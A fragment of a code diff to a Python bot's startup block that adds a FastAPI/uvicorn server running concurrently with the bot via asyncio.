     token = config.get('token')
     if not token or token == "YOUR_BOT_TOKEN_HERE":
@@ -971,8 +1873,33 @@ if __name__ == "__main__":
         logging.error("Bot token not configured")
     else:
         try:
+            # Start FastAPI in a separate thread
+            api_host = config.get('api_host', '0.0.0.0')
+            api_port = config.get('api_port', 8000)
+            
+            async def start_services():
+                # Configure FastAPI server
+                config = uvicorn.Config(
+                    app=app,
+                    host=api_host,
+                    port=api_port,
+                    log_level="info",
+                    access_log=True,
+                    loop="asyncio"
+                )
+                server = uvicorn.Server(config)
+                
+                # Create tasks for both services
+                api_task = asyncio.create_task(server.serve())
+                bot_task = asyncio.create_task(bot.start(token))
+                
+                # Run both services concurrently
+                await asyncio.gather(api_task, bot_task)
+            
+            # Run both services
+            logging.info(f"Starting services on http://{api_host}:{api_port}")
+            asyncio.run(start_services())
             bot.run(token)
         except Exception as e:
             logging.error(f"Failed to start bot: {e}")
-
             print(f"Failed to start bot: {e}")
